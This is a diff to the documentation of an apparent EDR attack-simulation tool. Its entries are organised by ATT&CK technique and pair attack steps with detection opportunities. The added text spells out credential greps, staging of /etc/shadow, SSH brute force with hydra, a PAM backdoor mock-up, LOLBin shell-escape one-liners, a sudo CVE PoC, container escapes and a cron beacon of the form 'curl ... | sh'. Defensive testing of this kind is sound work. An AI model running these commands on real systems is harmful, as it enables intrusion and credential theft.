@@ -148,6 +148,7 @@ How it works:
 1. Executes various system information commands
 2. Collects details about the operating system, hardware, kernel, and installed packages
 3. Saves all gathered information to a log file for telemetry analysis
+4. Concludes with a shell-driven recon batch (`uname -a; id; hostname; cat /etc/os-release; uptime; w`) executed through `/bin/sh -c` so the recon commands appear under a shell parent rather than directly under signalbench
 
 Parameters:
 - `output_file`: Path to save the system information
@@ -159,6 +160,7 @@ Artefacts:
 Observable patterns:
 - Multiple system information commands executed in rapid succession
 - Creation of files containing comprehensive system details
+- A `/bin/sh -c` parent process invoking the canonical recon one-liner
 
 ### T1016 - System Network Configuration Discovery
 
@@ -169,6 +171,7 @@ How it works:
 1. Runs various network configuration commands (ip addr, ip route, ifconfig, netstat)
 2. Collects information about network interfaces, routing tables, and open ports
 3. Creates a comprehensive log file of network information
+4. Concludes with a shell-driven recon batch (`ip a; ip r; arp -an; ss -tunap; resolvectl status`) executed through `/bin/sh -c` so the commands appear under a shell parent process
 
 Parameters:
 - `output_file`: Path to save the network information
@@ -180,6 +183,7 @@ Artefacts:
 Detection opportunities:
 - Multiple network discovery commands in short succession
 - Creation of files containing network configuration details
+- A `/bin/sh -c` parent invoking the canonical network recon one-liner
 
 ### T1016 - DNS reconnaissance or enumeration via DNSRecon
 
@@ -238,6 +242,7 @@ How it works:
 1. Executes various connection-gathering commands (netstat, ss, lsof)
 2. Logs all current network connections, listening ports, and associated processes
 3. Creates a comprehensive network connections map
+4. Concludes with a shell-driven recon batch (`ss -tunap; netstat -tunap; lsof -i | head -50`) executed through `/bin/sh -c` and piped, so the commands appear under a shell parent
 
 Parameters:
 - `output_file`: Path to save connection discovery results
@@ -249,6 +254,7 @@ Artefacts:
 Detection opportunities:
 - Process monitoring can detect network connection discovery commands
 - Multiple network-related commands executed in sequence
+- A `/bin/sh -c` parent invoking the canonical connection recon pipeline
 
 ## CREDENTIAL_ACCESS Techniques
 
@@ -285,8 +291,9 @@ Executes REAL keylogging techniques by accessing input devices and capturing key
 How it works:
 1. Enumerates available input devices using xinput list and /dev/input
 2. Attempts to read from keyboard device files for keystroke capture
-3. Records captured keystrokes with timestamps in a log file
-4. Identifies potential credentials in captured input patterns
+3. Each `dd` reader is launched daemonised via `nohup ... &` from a short-lived shell: the spawning shell exits immediately, leaving `dd` reparented to init (PPID=1), which matches the orphaned-daemon pattern real keyloggers produce
+4. Records captured keystrokes with timestamps in a log file
+5. Identifies potential credentials in captured input patterns
 
 Parameters:
 - `log_file`: Path to save the keylogger output
@@ -297,7 +304,7 @@ Artefacts:
 
 Detection opportunities:
 - Processes reading from keyboard device files
-- Suspicious keyboard hook API calls
+- Orphaned `dd` processes with PPID=1 reading `/dev/input/event*`
 - File creation with credential-like content
 
 ### T1552.001 - Credentials in Files
@@ -309,7 +316,8 @@ How it works:
 1. Creates test credential files with realistic content (.env, config.json, etc.)
 2. Searches for credential patterns in configuration files
 3. Simulates credential discovery and harvesting
-4. Reports findings in detailed logs
+4. After the in-process Regex sweep, runs three shell-driven `grep` invocations through `/bin/sh -c` against `/etc /home /root` for distinctive DLP patterns (AWS access keys matching `AKIA[0-9A-Z]{16}` and `aws_secret_access_key`; PEM and OpenSSH private key headers; and JDBC, MongoDB, PostgreSQL, MySQL connection strings). Output is staged at `/tmp/signalbench_dlp_*.txt`. Each grep runs under `timeout 30` to bound runtime.
+5. Reports findings in detailed logs
 
 Parameters:
 - `search_paths`: Paths to search for credential files
@@ -319,11 +327,13 @@ Parameters:
 Artefacts:
 - Test credential files (cleaned up automatically after execution)
 - Credential discovery logs (cleaned up automatically after execution)
+- DLP grep stage files at `/tmp/signalbench_dlp_*` (cleaned up automatically)
 
 Detection opportunities:
 - Monitor for processes accessing configuration files
 - Unusual file access patterns
 - Credential harvesting tools
+- `grep` child processes against `/etc`, `/home`, or `/root` with AWS key, private-key header, or database connection-string regex in argv
 
 ### T1003.007 - OS Credential Dumping: Proc Filesystem
 
@@ -357,34 +367,35 @@ Detection opportunities:
 - Process memory analysis and credential extraction attempts
 - Creation of memory dump files in temporary directories
 
-### T1110.002 - Hydra Brute Force Tool Execution
+### T1110.002 - SSH Brute Force
 
 Description:  
-Executes the Hydra password brute-forcing tool with visible attack parameters to generate REAL brute force telemetry for EDR detection.
+Performs real SSH brute-force authentication attempts against the configured target. When running as root the technique creates a temporary local test user; otherwise it brute-forces existing accounts. Attempts rotate through realistic service-account usernames so the failed-auth pattern in `/var/log/auth.log` matches what a Hydra/Medusa run produces, and a hydra invocation is attempted when the binary is present so the tool name appears in argv.
 
 How it works:
-1. Downloads the Palo Alto Wildfire ELF test file (harmless malware test binary)
-2. Saves the file as 'hydra' to replicate the password brute-force tool
-3. Makes the file executable and executes with realistic attack arguments
-4. Runs hydra with visible process arguments: -l user -P wordlist target service
-5. Generates process tree telemetry showing brute force attack patterns
+1. When running as root, creates a temporary test user via `useradd`/`chpasswd` for a safe baseline attempt
+2. Builds a username rotation: the test user followed by `root`, `admin`, `postgres`, `oracle`, `git`, `deploy`, `ubuntu`, `test`. Each attempt picks the next username in the rotation so the auth-log shows attempts spread across multiple service accounts (the canonical brute-force signature) rather than concentrated on one user.
+3. For each attempt, invokes `sshpass -p <password> ssh ... <user>@<host>` (or falls back to direct `ssh` when `sshpass` is unavailable). Records response timing for timing-attack analysis.
+4. Paces attempts at ~10/s (100ms between attempts) so the burst rate matches the SSH brute-force signatures Snort and Cortex correlation rules key on.
+5. When `hydra` is on PATH, stages a username list and a password list under `/tmp/.cache_*_<session>` and invokes `hydra -L <users> -P <passwords> -t 4 -f -o ... -s <port> <host> ssh`. The `hydra` argv entry is the high-value tool fingerprint regardless of whether the attempt succeeds.
+6. On root, cleans up the temporary test user with `userdel -r`. Stage files for hydra are removed after the invocation.
 
 Parameters:
-- `hydra_path`: Path where the hydra binary will be saved (default: /tmp/hydra)
-- `target_service`: Target service type (ssh, ftp, http, etc.) (default: ssh)
-- `log_file`: Path to save brute force attempt log (default: /tmp/signalbench_hydra_log)
+- `target_host`: Target SSH host (default: localhost)
+- `target_port`: Target SSH port (default: 22)
+- `attempt_count`: Number of sshpass attempts in the 5-10 range (default: 8)
 
 Artefacts:
-- Hydra binary file (Wildfire test file) (cleaned up automatically after execution)
-- Brute force attempt log file (cleaned up automatically after execution)
+- Brute force attempt log under `/tmp/signalbench_brute_force_<session>.log` (cleaned up automatically)
+- Artifacts JSON under `/tmp/signalbench_brute_force_<session>_artifacts.json` (cleaned up automatically)
+- Temporary test user (when root) removed via `userdel -r` on cleanup
 
 Detection opportunities:
-- Network connections to Wildfire test file URLs
-- Download of files with known attack tool names
-- Execution of processes named 'hydra' or other password brute-force tools
-- File creation patterns matching attack tool installation
-- chmod operations on files with suspicious names
-- Repeated authentication attempts from single sources (if real hydra were used)
+- Rapid sequential SSH authentication failures from a single source against multiple usernames (canonical brute-force signature)
+- `sshpass` binary execution
+- `hydra` binary execution with `-L`/`-P`/`-t` arguments
+- Failed auth log entries naming common service accounts (`root`, `admin`, `postgres`, `oracle`, `git`, `deploy`, `ubuntu`, `test`) in close succession from the same source
+- Burst-rate authentication attempts (multiple per second) against SSH
 
 ### T1003.008 - /etc/passwd and /etc/shadow
 
@@ -435,6 +446,45 @@ Detection opportunities:
 - File access patterns indicating user enumeration
 - Unusual processes reading authentication-related files
 - Sudo commands attempting to access /etc/shadow
+- `cat /etc/passwd` and `cat /etc/shadow` invoked under a `/bin/sh -c` parent with stdout redirected to `/tmp/signalbench_passwd_stage_*` and `/tmp/signalbench_shadow_stage_*` (staging phase 2b - the cat exec on `/etc/shadow` plus the redirect to a staging path is the high-severity signature)
+- `grep -E '^(root|admin|sudo):' /etc/shadow` chained from the same shell phase, staging the privileged entries to `/tmp/signalbench_passwd_shadow_priv_*`
+
+### T1556.003 - PAM Backdoor
+
+Description:
+Simulates the post-XZ Utils (CVE-2024-3094) PAM backdoor TTP that became widely deployed in 2024-2025.  Real attackers replace the system `pam_unix.so` with a malicious build that hooks `pam_sm_authenticate` and `pam_get_authtok` to log credentials in cleartext, then add an `auth sufficient <module.so>` line to `/etc/pam.d/sshd` so the backdoor is consulted ahead of the real `pam_unix`.  This technique reproduces the syscall trace -- writes, copies, ldconfig invocation, PAM config modification -- without delivering a working backdoor.
+
+How it works:
+1. Writes a minimal ELF64-shaped binary blob to `/tmp/signalbench_pam_<session>.so` containing the same exported-symbol strings a real PAM module would (`pam_sm_authenticate`, `pam_get_authtok`, `pam_sm_setcred`, `pam_get_user`) so `file(1)` and `strings` analysis classifies it realistically.
+2. Attempts to copy the fake module into every standard PAM module directory:
+   - `/lib/security/`
+   - `/lib/x86_64-linux-gnu/security/`
+   - `/lib64/security/`
+   - `/usr/lib/security/`
+   Without root every `cp` call fails with `EACCES` -- the failed `openat()` / `write()` syscalls against PAM directories are the EDR signal regardless of outcome.
+3. If running as root, backs up `/etc/pam.d/sshd` (or the configured `pam_file`) to `/tmp/signalbench_pam_backup_<session>.bak` and appends an `auth sufficient <fake.so>` line under a `# SIGNALBENCH-PAM-BACKDOOR-<session>` marker.
+4. If not root, performs a read-only probe of the PAM config so the `open()` syscall is still captured.
+5. Invokes `ldconfig` so the dynamic linker cache flush -- the canonical follow-on signal real attackers emit after dropping a module -- is on the wire.
+6. Persists artifact metadata to `/tmp/signalbench_pam_backdoor_<session>.json` for cleanup.
+
+Parameters:
+- `pam_file`: PAM configuration file to back up and modify (default `/etc/pam.d/sshd`)
+- `module_name`: Filename for the fake PAM module (default `pam_unix.so` to mimic the real glibc-bundled module)
+
+Artefacts:
+- Fake `.so` module at `/tmp/signalbench_pam_<session>.so` (removed at cleanup)
+- Backup of PAM config at `/tmp/signalbench_pam_backup_<session>.bak` (removed at cleanup, contents restored to original location first)
+- Any successful copies into `/lib*/security/` directories (removed at cleanup)
+- Metadata JSON at `/tmp/signalbench_pam_backdoor_<session>.json`
+
+Detection opportunities:
+- Write syscalls to `/etc/pam.d/*` from non-package-manager processes
+- Creation of `.so` files in `/lib/security/`, `/lib/x86_64-linux-gnu/security/`, or `/lib64/security/`
+- `ldconfig` invocations not parented by a package manager or systemd
+- New `auth` / `account` / `password` / `session` lines in PAM configurations that reference module paths outside `/lib*/security/`
+- `cp` operations targeting `/lib*/security/` from user processes
+- File integrity monitoring alerts on `pam_unix.so` modification
+- These signals were heavily exercised by EDR vendors throughout 2024-2025 following the XZ Utils backdoor disclosure -- detection coverage is mature.
 
 ## DEFENSE_EVASION Techniques
 
@@ -553,8 +603,9 @@ Executes REAL PATH interception by modifying environment variables to control wh
 
 How it works:
 1. Documents current PATH and LD_LIBRARY_PATH variables
-2. Simulates adding a malicious directory to the beginning of PATH
-3. Creates a log file showing how a legitimate command could be intercepted
+2. Creates trojan wrapper scripts in the hijack directory for ls, ps, whoami, sudo, ssh, curl, and wget. Each wrapper logs the invocation then chains to the real binary by absolute path.
+3. Invokes the hijacked commands through a PATH-modified shell: `/bin/sh -c "export PATH=<hijack_dir>:$PATH; ls -la /tmp; ps aux; whoami; sudo -n true; ssh -V; curl --version; wget --version"`. The trojan wrappers run because they precede the real binaries in PATH, producing the canonical PATH-hijack process tree (shell -> trojan -> real binary).
+4. Creates a log file showing how a legitimate command could be intercepted
 
 Parameters:
 - `custom_path`: Directory to add to PATH variable
@@ -562,41 +613,39 @@ Parameters:
 
 Artefacts:
 - Environment variable log file (cleaned up automatically after execution)
+- Trojan wrapper scripts in the hijack directory (cleaned up automatically after execution)
 
 Detection opportunities:
 - Unusual modifications to PATH or LD_LIBRARY_PATH
 - Creation of executable files in non-standard locations
+- Common system commands (ls, ps, whoami, sudo, ssh, curl, wget) being executed from `/tmp` rather than `/bin` or `/usr/bin`
+- A `/bin/sh -c` parent that exports PATH then runs multiple system commands in sequence
 
 ### T1036.003 - Masquerading
 
 Description:  
-Performs REAL process masquerading by copying system binaries and executing them with spoofed names to evade detection by mimicking legitimate system daemons. This technique creates actual processes with misleading names and manipulated command-line arguments.
+Performs REAL process masquerading by compiling short C binaries that rename themselves at runtime via `prctl(PR_SET_NAME)` to appear in `ps` as legitimate system processes. Each masqueraded process then performs activity a real kernel worker or system daemon would not - writing to a stage file and opening a TCP socket - so the detection signal goes beyond a strange `ps` row.
 
 How it works:
-1. Copies REAL system binaries (/bin/sh, /bin/bash) to temporary locations with legitimate daemon names (crond, systemd, sshd)
-2. Sets executable permissions on masqueraded binaries
-3. EXECUTES the masqueraded binaries to generate authentic process execution telemetry
-4. Manipulates process names using exec -a for command-line spoofing
-5. Creates multiple masquerading variants to test different detection scenarios
-6. Generates realistic process trees with spoofed parent-child relationships
-7. Logs all copying, execution, and process manipulation activities
+1. Compiles short C source files (one per masquerade target) that call `prctl(PR_SET_NAME)` with the spoofed name, then perform file and network activity to break the kernel-thread invariants
+2. Runs three masqueraded children in parallel: `[kworker/0:0]`, `systemd-journald`, and `crond`
+3. Each masqueraded child writes a stage file (`/tmp/signalbench_masquerade_*/.stage-*`) and opens a non-blocking TCP socket to the sinkhole on port 80. A real `[kworker]` thread does not open user-space sockets - this is the strong behavioural signal.
+4. Verifies that `ps aux` shows the spoofed names
+5. Restores the original process name on completion
 
 Parameters:
-- `daemon_names`: Comma-separated list of daemon names to masquerade as (default: crond,systemd,sshd)
-- `target_dir`: Directory where masqueraded binaries will be created (default: /tmp)
-- `execute_all`: Whether to execute all masqueraded binaries (default: true)
-- `log_file`: Path to save masquerading log (default: /tmp/signalbench_masquerade_log)
+- None at runtime; targets and durations are fixed
 
 Artefacts:
-- Masqueraded binary files (cleaned up automatically after execution)
-- Process execution logs with spoofed command lines (cleaned up automatically)
-- Masquerading activity log file (cleaned up automatically)
+- Compiled masquerade binaries and C sources under `/tmp/signalbench_masquerade_<uuid>/` (cleaned up automatically)
+- Stage files written by each masqueraded child (cleaned up automatically)
+- PIDs of running masqueraded children, tracked for cleanup
 
 Detection opportunities:
-- Monitor for copying system binaries to uncommon locations
-- Look for execve events with arguments like 'cp /bin/sh <path>/crond'
-- Detect processes named 'crond', 'systemd', 'sshd' running from non-standard paths
-- Watch for legitimate system daemon names in /tmp or other temporary directories
+- `prctl(PR_SET_NAME)` syscalls renaming a process to `[kworker/...]`, `systemd-journald`, or `crond`
+- Processes named `[kworker/0:0]` opening user-space TCP sockets or writing to user paths under `/tmp` (kernel workers never do this)
+- `ps aux` showing kernel-thread names attached to binaries executed from `/tmp`
+- Outbound TCP SYN to the sinkhole on port 80 from a process appearing as a kernel worker
 - Process name mismatches with expected execution paths and binary hashes
 - Command-line manipulation patterns using exec -a
 
@@ -643,6 +692,54 @@ Detection opportunities:
 - Process behaviour indicating anti-forensics activities
 - File deletion operations on sensitive file types (logs, databases, archives)
 - Timeline manipulation attempts (touch, utimes system calls)
+
+### T1218 - LOLBin Proxy Execution (Linux)
+
+Description:
+Executes a curated set of LOLBin (Living Off the Land Binary) abuse patterns that spawn child processes from binaries that parent-process heuristics do not expect to fork shells.  Whereas `T1548-GTFOBINS` only probes the system to enumerate exploitable binaries, this technique actually executes the abuse patterns so EDR parent-process and unusual-child-spawn rules fire.  All child commands are read-only (`id`, `hostname`) -- the TTP signal is the fork+exec anomaly itself, not the command output.
+
+How it works:
+1. Iterates through a built-in list of LOLBin patterns (see `LOLBIN_PATTERNS` in `src/techniques/gtfobins.rs`).  Each pattern names the binary that must be present, the full argv to execute, and a brief description of the abuse vector.
+2. For each pattern, runs `which <binary>` first and skips cleanly when the binary is missing (no telemetry value in trying to spawn something that does not exist).
+3. Spawns the abuse argv with stdout/stderr captured and a 5-second per-pattern timeout.
+4. Logs the result with the pattern name, exit code, elapsed milliseconds, and the first line of stdout where present.
+5. Sleeps `delay_ms` (default 250ms) between patterns so each parent-process / child-process pair is a discrete event rather than a burst.
+
+Patterns shipped (16 total):
+- `awk-system`            -- `awk 'BEGIN{system("id")}'` (awk forking /bin/sh)
+- `find-exec`             -- `find /tmp -maxdepth 1 -name . -exec id ;` (find -exec spawn)
+- `vim-shell`             -- `vim -E -s -c '!id' -c 'qa!'` (vim Ex-mode shell-out)
+- `vi-shell`              -- `vi -e -s -c '!id' -c 'qa!'`
+- `ex-shell`              -- `ex -s -c '!id' -c 'qa!'`
+- `python-os-system`      -- `python3 -c "import os; os.system('id')"`
+- `python-subprocess`     -- `python3 -c "import subprocess; subprocess.run(['id'])"`
+- `perl-system`           -- `perl -e "system('id')"`
+- `perl-backticks`        -- `perl -e "print \`id\`"`
+- `ruby-system`           -- `ruby -e "system('id')"`
+- `xxd-passwd`            -- `xxd /etc/passwd` (canonical hex-dump exfil pattern)
+- `sed-exec`              -- `sed '1e id' /etc/hostname` (sed e-command shell exec)
+- `env-exec`              -- `env id` (env wrapper exec)
+- `tar-checkpoint`        -- `tar -cf /dev/null --checkpoint=1 --checkpoint-action=exec=id /etc/hostname`
+- `gdb-batch-shell`       -- `gdb -q -batch -ex 'shell id'`
+- `expect-spawn`          -- `expect -c 'spawn id; expect'`
+
+Parameters:
+- `patterns`: Comma-separated list of pattern names to run (default `all`).  Lets operators target a single LOLBin family, e.g. `patterns=vim-shell,ex-shell,vi-shell` to exercise just the editor shell-out vectors.
+- `delay_ms`: Milliseconds to sleep between patterns (default 250).  Set to 0 for a burst.
+
+Artefacts: None.  This technique writes nothing to disk; all telemetry is ephemeral parent/child process events.  `cleanup_support` is declared `true` for consistency but `cleanup()` is a no-op.
+
+Detection opportunities:
+- Parent-process anomaly: awk / vim / vi / ex / sed / find / perl / python / ruby / tar / gdb / expect / env / xxd forking `/bin/sh`, `/bin/bash`, or a process commonly invoked from shell pipelines
+- `awk` with argv containing the literal string `BEGIN{system(`
+- `vim` / `vi` / `ex` with `-c '!cmd'` arguments
+- `find` invocations with `-exec`
+- `perl` / `python` / `python3` / `ruby` with `-e` / `-c` flags carrying `system(`, `exec(`, `os.system(`, `subprocess.`, or backticks
+- `tar` with `--checkpoint-action=exec=`
+- `gdb -batch -ex 'shell ...'`
+- `expect -c 'spawn ...'`
+- `xxd` reading `/etc/passwd`, `/etc/shadow`, or any path under `/root/`
+- EDR products with parent-process anomaly heuristics (CrowdStrike Falcon, Microsoft Defender for Endpoint, SentinelOne, Elastic Defend) flag these patterns as living-off-the-land binary abuse
 
 ## EXECUTION Techniques
 
@@ -739,7 +836,7 @@ Executes a potentially malicious Python script.
 How it works:
 1. Creates a Python script file with simulated malicious content
 2. Script includes various suspicious behaviours like system reconnaissance, file operations
-3. Executes the Python script and logs output
+3. Invokes the script via `/bin/sh -c "python3 <script>"` so the process tree is signalbench -> sh -> python3. Real attackers invariably invoke Python through a shell; behavioural rules calibrated on Linux endpoints expect that lineage.
 
 Parameters:
 - `script_file`: Path to create and save the Python script
@@ -753,6 +850,7 @@ Artefacts:
 Detection opportunities:
 - Creation and execution of Python scripts with suspicious content
 - Scripts that collect system information or simulate data exfiltration
+- A `/bin/sh -c` parent spawning `python3` running a script from `/tmp`
 
 ### T1059.004.001 - Uncommon Remote Shell Commands
 
@@ -1006,6 +1104,14 @@ How it works:
 1. Creates a temporary sudoers file in the /etc/sudoers.d/ directory
 2. Grants specified privileges to a user
 3. Validates syntax of the sudoers file before installation
+4. Post-escalation verification: runs `sudo -n id -u` as a child process and logs the observed EUID
+
+Verification phase:
+- Uses shared `verify_command` helper to run `sudo -n id -u` after the sudoers entry is active
+- Logs `[T1548.003] [VERIFIED] sudo ok: 0` when the escalation path is confirmed
+- On success, additionally logs `[T1548.003] [CRITICAL] Privilege escalation VERIFIED: sudo ok: 0`
+- Logs `[T1548.003] [UNVERIFIED] <reason>` when the escalation is not achieved
+- Verification failure does not prevent cleanup
 
 Parameters:
 - `username`: User to grant elevated privileges
@@ -1017,6 +1123,7 @@ Artefacts:
 Detection opportunities:
 - Creation or modification of files in /etc/sudoers.d/
 - Changes to sudo privileges
+- `sudo -n id -u` execution immediately after sudoers modification (post-escalation EUID check)
 
 ### T1548.003.001 - Sudo Unsigned Integer Privilege Escalation
 
@@ -1052,6 +1159,14 @@ How it works:
 1. Creates a small executable file
 2. Sets the SUID bit on the file
 3. Simulates how this could be used for privilege escalation
+4. Post-escalation verification: invokes the SUID binary, parses `Effective UID:` from its output, and logs the observed EUID
+
+Verification phase:
+- Uses shared `verify_command` helper to invoke the SUID binary and check for `Effective UID: 0` in its stdout
+- Logs `[T1548.001] [VERIFIED] SUID binary ran with Effective UID: 0` when escalation is confirmed
+- On success, additionally logs `[T1548.001] [CRITICAL] Privilege escalation VERIFIED: SUID binary ran with Effective UID: 0`
+- Logs `[T1548.001] [UNVERIFIED] <reason>` when escalation is not achieved
+- Verification failure does not prevent cleanup
 
 Parameters:
 - `target_binary`: Path to create the SUID binary
@@ -1062,6 +1177,7 @@ Artefacts:
 Detection opportunities:
 - Creation of new SUID binaries
 - Modification of file permissions to add SUID bit
+- Execution of SUID binary immediately after chmod u+s (post-escalation EUID check)
 
 ### T1136.001 - Local Account Creation
 
@@ -1090,26 +1206,39 @@ Detection opportunities:
 ### T1068 - Exploitation for Privilege Escalation
 
 Description:  
-Using local privilege escalation exploits (e.g., Dirty Pipe, Dirty COW, kernel module exploits).
+Performs both enumeration of local privilege-escalation vectors and active exploitation attempts against them. Covers the canonical CVE-2019-14287 sudo PoC, GTFOBin shell-escape patterns against discovered SUID binaries, writable systemd unit exploitation, NOPASSWD sudo command execution, Docker socket abuse, and writable cron file modification. All exploit attempts are reversible.
 
 How it works:
-1. Simulates common privilege escalation exploits
-2. Creates realistic simulation logs based on exploit type
-3. Detects kernel version for realistic testing
-4. Completely harmless - only creates test files, no actual exploitation
+1. Section 0 - CVE-2019-14287 PoC: runs `sudo -n -u#-1 id` (the canonical published PoC). On patched sudo it fails with an authentication error but still produces an auth-log entry showing the unusual `-u#-1` argument; on an unpatched system the EUID returns 0.
+2. Section 1 - SUID enumeration + GTFOBin invocation: enumerates SUID binaries under `/usr/bin`, `/usr/sbin`, `/usr/local/bin`, `/usr/local/sbin`, `/bin`, `/sbin`, then for any binary whose basename matches a known GTFOBin pattern (find, awk, python, python3, perl, env, vim, less) fires the canonical shell-escape invocation through `/bin/sh -c` with `timeout 1` so the spawned shell exits immediately. The exec attempt itself is the telemetry signal.
+3. Section 2 - Systemd unit exploitation: when `/etc/systemd/system` is writable, creates a test service, runs `systemctl daemon-reload`, then attempts `systemctl start`. The created service file is tracked for cleanup.
+4. Section 3 - Writable cron files: enumerates writable cron files under `/etc/crontab`, `/etc/cron.d`, and `/var/spool/cron`, then appends a recognisable beacon line of the form `* * * * * root /bin/sh -c 'curl -s http://<sinkhole>/sb-<session> | sh'` to each one. The original file is backed up first and restored on cleanup.
+5. Section 4 - Sudo NOPASSWD exploitation: runs `sudo -n -l` to enumerate permissions, parses NOPASSWD entries, then attempts to execute the safe ones (whoami, id, ls, cat, echo, true, false, pwd) to confirm exploitability.
+6. Section 5 - Docker socket exploitation: when `/var/run/docker.sock` is accessible, runs `docker ps` then `docker run --rm alpine echo` to confirm escape capability.
+7. Section 6 - Kernel version enumeration: reads `/proc/version` and `uname -r` for vulnerable-kernel matching.
 
 Parameters:
-- `exploit_type`: Type of privilege escalation exploit to simulate (dirty_pipe, dirty_cow, generic)
-- `target_file`: Target file for the simulated exploit
+- `suid_scan`: Enable SUID enumeration and GTFOBin invocation (default: true)
+- `systemd_exploit`: Attempt writable systemd unit exploitation (default: true)
+- `cron_scan`: Enable writable cron enumeration and beacon append (default: true)
+- `sudo_exploit`: Attempt NOPASSWD sudo command execution (default: true)
+- `docker_exploit`: Attempt Docker socket exploitation (default: true)
+- `kernel_check`: Enable kernel version enumeration (default: true)
+- `log_file`: Path to save the detailed exploitation log
 
 Artefacts:
-- Privilege escalation simulation files (cleaned up automatically after execution)
+- Detailed exploitation log (cleaned up automatically after execution)
+- Created systemd service file at `/etc/systemd/system/signalbench-test.service` (removed on cleanup with daemon-reload)
+- Cron file backups under `/tmp/signalbench_cron_backup_*` (restored to original location on cleanup, then removed)
+- The appended cron beacon line in each writable cron file (removed on cleanup by restoring the backup)
 
 Detection opportunities:
-- Monitor for unusual kernel module loading
-- Suspicious process behaviour
-- Exploitation indicators
-- Privilege escalation attempts
+- `sudo` invoked with `-u#-1` or similar negative UID syntax (CVE-2019-14287 PoC fingerprint)
+- Suspicious GTFOBin invocations: `find ... -exec /bin/sh -p \;`, `awk 'BEGIN {system(...)}'`, `python -c 'os.execl("/bin/sh", "sh", "-p"...)'`, `perl -e 'exec "/bin/sh", "-p"...'`
+- Service file creation under `/etc/systemd/system/` followed by `systemctl daemon-reload` and `systemctl start`
+- Append of a cron line containing `curl ... | sh` to `/etc/crontab` or `/etc/cron.d`
+- `sudo -n -l` enumeration followed by NOPASSWD command execution
+- Direct interaction with `/var/run/docker.sock` via the docker CLI or curl
 
 ## CONTAINER_ESCAPE Techniques (T1611)
 
@@ -1171,6 +1300,18 @@ XDR Detection Signatures:
 - Docker API responses containing container IDs
 - JSON body with "Privileged":true, "Binds":["/:/host"] patterns
 
+Host Access Verification:
+After spawning the privileged container, this technique runs
+`docker run --rm -v /:/host:ro alpine cat /host/etc/shadow` (15 s
+timeout) and inspects the output for a line starting with `root:`. On
+success it logs `[T1611-SOCK] [VERIFIED] ...` followed by
+`[T1611-SOCK] [CRITICAL] Host filesystem access VERIFIED: ...`. If the
+sibling-container marker was never created or `attempt_run=false`, an
+explicit `[T1611-SOCK] [UNVERIFIED] ...` line is emitted instead so
+every run carries a marker. Detection engineers should grep for
+`[CRITICAL] Host filesystem access VERIFIED` as the highest-confidence
+post-escape signal.
+
 ### T1611-PRIV - Privileged Container Escape
 
 Description:  
@@ -1218,6 +1359,18 @@ XDR Detection Signatures:
 - mount --bind and mount -t tmpfs attempts
 - Process targeting PID 1 from container
 - CAP_SYS_ADMIN + CAP_SYS_PTRACE usage patterns
+
+Host Access Verification:
+After the nsenter marker write, this technique runs
+`nsenter --target 1 --mount --pid -- cat /proc/1/comm` (10 s timeout) and
+requires the trimmed value to match a known host init binary
+(`systemd`, `init`, `upstart`, `openrc`, `sysvinit`, `launchd`). A
+non-empty cmdline alone is not enough — the container's own PID 1
+cmdline is also non-empty, so the check would otherwise false-positive.
+A matching host init name proves nsenter actually entered the host PID
+namespace. On success it logs `[T1611-PRIV] [VERIFIED] ...` followed by
+`[T1611-PRIV] [CRITICAL] Host filesystem access VERIFIED: ...`; on
+failure it logs `[T1611-PRIV] [UNVERIFIED] ...`.
 
 ### T1611-MOUNT - Sensitive Mount Escape
 
@@ -1275,6 +1428,23 @@ XDR Detection Signatures:
 - Symlink traversal attempts via /var/log/signalbench_*
 - K8s hostPath log volume symlink manipulation
 
+Host Access Verification:
+After each chroot marker write, this technique reads the container's
+own `/etc/machine-id` directly, then runs
+`chroot <bind_target> /bin/cat /etc/machine-id` and
+`chroot /host /bin/cat /etc/machine-id` (10 s timeout each) and
+requires the chroot-side value to be non-empty AND different from the
+container's machine-id. The machine-id is a per-installation
+identifier, so a different value proves the chroot landed on a
+genuinely separate filesystem (the host root); equal values mean we
+chrooted into our own root and nothing was actually escaped. A simple
+`uname -a` check is insufficient because `/bin/uname` is not host-only
+and non-empty output does not establish host context. Each successful
+read logs `[T1611-MOUNT] [VERIFIED] ...` followed by
+`[T1611-MOUNT] [CRITICAL] Host filesystem access VERIFIED: ...`;
+failures log `[T1611-MOUNT] [UNVERIFIED] ...` with both machine-ids in
+the evidence.
+
 ### T1611-CGROUP - cgroup Release Agent Escape
 
 Description:  
@@ -1328,6 +1498,19 @@ XDR Detection Signatures:
 - cat /proc/self/mountinfo for mount namespace info (Unit42)
 - Parsing of overlay upperdir paths to find host filesystem
 - Host path discovery via overlay2 storage driver paths
+
+Host Access Verification:
+After triggering release_agent, this technique polls
+`/tmp/signalbench_cgroup_escape_marker` for up to 10 seconds (500 ms
+interval). On detection it logs `[T1611-CGROUP] [VERIFIED] ...`
+followed by `[T1611-CGROUP] [CRITICAL] Host filesystem access
+VERIFIED: ...`; on timeout it logs `[T1611-CGROUP] [UNVERIFIED] marker
+not observed within 10s`. If preconditions for the trigger phase were
+not met (CAP_SYS_ADMIN missing, mount blocked, or
+`attempt_cgroup_mount=false`), an explicit
+`[T1611-CGROUP] [UNVERIFIED] release_agent verification phase not
+reached (...)` line is emitted at the end of the technique so every
+run carries a marker.
 
 ### T1611-MODULE - Kernel Module Escape
 
@@ -1484,6 +1667,23 @@ XDR Detection Signatures:
 - Containers started with --pid=host flag
 - CAP_SYS_PTRACE capability usage from container
 
+Host Access Verification:
+A naive comparison of `readlink /proc/1/ns/pid` and `readlink
+/proc/self/ns/pid` from inside the container is unsound: in a normal
+container both calls return the container's PID namespace, and in a
+`--pid=host` container both calls return the host's PID namespace, so the
+two values always match. Instead this technique verifies against a host
+baseline by reading `/proc/1/comm` and `/proc/1/cmdline` and comparing
+them to known host init names (`systemd`, `init`, `upstart`, `openrc`,
+`sysvinit`, `launchd`) and host init paths (`/sbin/init`,
+`/lib/systemd/systemd`, `/usr/lib/systemd/systemd`, `/usr/sbin/init`),
+combined with a count of numeric `/proc` entries (visible PIDs).
+Verification requires both signals: an init-style PID 1 AND visible PID
+count above 50 (the typical container ceiling). On success it logs
+`[T1611-PIDNS] [VERIFIED] ...` followed by `[T1611-PIDNS] [CRITICAL]
+Host filesystem access VERIFIED: ...`; otherwise it logs
+`[T1611-PIDNS] [UNVERIFIED] ...` with the observed signals.
+
 ### T1611-SUID - SUID Privilege Escalation Escape
 
 Description:  
@@ -1551,7 +1751,7 @@ Parameters:
 - `protocol`: Protocol to use for exfiltration (dns, icmp, http)
 - `data_file`: Path to save simulated data to be exfiltrated
 - `log_file`: Path to save exfiltration log
-- `target`: Target for exfiltration (domain for DNS, IP for ICMP, URL for HTTP)
